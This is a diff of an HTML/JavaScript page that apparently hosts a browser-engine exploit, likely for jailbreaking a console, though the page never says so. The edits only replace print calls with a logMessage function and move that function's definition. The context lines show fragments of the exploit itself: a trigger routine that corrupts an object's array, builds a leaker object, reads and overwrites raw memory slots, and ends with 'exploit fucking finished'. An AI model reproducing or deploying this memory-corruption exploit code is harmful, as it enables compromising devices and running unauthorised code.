@@ -47,7 +47,7 @@
 
     function trigger(x) {
       if (impl.a != target) {
-        print("wtf?");
+        logMessage("wtf?");
         while (1);
       }
       var o = {
@@ -62,9 +62,9 @@
         o[i];
       }
       if (impl.a != target) {
-        print("corrupted!");
-        print(typeof(impl.a));
-        print(impl.a.length);
+        logMessage("corrupted!");
+        logMessage(typeof(impl.a));
+        logMessage(impl.a.length);
         target.c = leaker_obj;
         leaker_obj.a = leaker_obj;
         var l1 = impl.a[4];
@@ -79,7 +79,7 @@
         impl.a[4] = s1;
         impl.a[5] = s2;
         impl.a = target;
-        print([l1, l2, s1, s2]);
+        logMessage([l1, l2, s1, s2]);
         throw "exploit fucking finished";
       }
     }
@@ -92,7 +92,7 @@
         trigger(s);
       }
     } catch (e) {
-      print("error: " + e);
+      logMessage("error: " + e);
     }
 
     function i48_put(b, c) {
@@ -547,6 +547,7 @@
 
   <script>
     window.addEventListener("load", function() {
+
       function DLProgress(e) {
         document.getElementById("ScrOverlay").style.display = "block";
         var Percent = Math.round((e.loaded / e.total) * 100);
@@ -579,16 +580,17 @@
       if (localStorage.passcount == null) localStorage.passcount = 0;
       if (localStorage.failcount == null) localStorage.failcount = 0;
     });
-
-    function logMessage(msg, id) {
-      document.getElementById(id).textContent += msg + "\r\n";
-    }
   </script>
   <script src="common/jb.js"></script>
 
 </head>
 
 <body>
+  <script>
+    function logMessage(msg) {
+      document.getElementById("logs").textContent += msg + "\r\n";
+    }
+  </script>
   <div id="logarea" style="display: none; ">
     <nav class="navbar navbar-expand-md p-0 bg-dark">
       <div class="container-fluid">
